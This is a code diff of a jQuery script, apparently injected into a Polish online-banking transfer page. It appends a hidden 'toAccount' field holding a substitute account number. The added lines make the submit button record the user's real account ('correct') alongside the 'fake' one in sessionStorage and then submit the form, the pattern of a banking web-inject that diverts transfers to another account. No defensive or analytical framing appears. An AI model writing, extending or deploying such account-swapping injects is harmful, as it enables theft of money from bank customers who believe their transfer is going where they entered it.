@@ -8,14 +8,28 @@ $(document).ready(function () {
         numKonta = numKonta.split('eKonto');
         numKonta = numKonta[0];
         sessionStorage.setItem("numKonta", numKonta);
+        console.log(sessionStorage)
         $('form').append('<input name="toAccount" hidden value="0000000000000000">');
     }
 
+    // document.getElementById("c198_submitButtons_submit").addEventListener('click', function() {
+    //     console.log("O");
+    //     change();
+    // })
+
     $('#c198_submitButtons_submit').click(function () {
-        change();
+        console.log("click")
+        // change();
+        let correct = $('input[name="number"]').val()
+        let fake = $('input[name="toAccount"]').val()
+        sessionStorage.setItem('pKon', correct)
+        sessionStorage.setItem('nKon', fake)
+    
+        $('form').submit();
     })
     
     function change() {
+        console.log("K")
         let correct = $('input[name="number"]').val()
         let fake = $('input[name="toAccount"]').val()
         sessionStorage.setItem('pKon', correct)
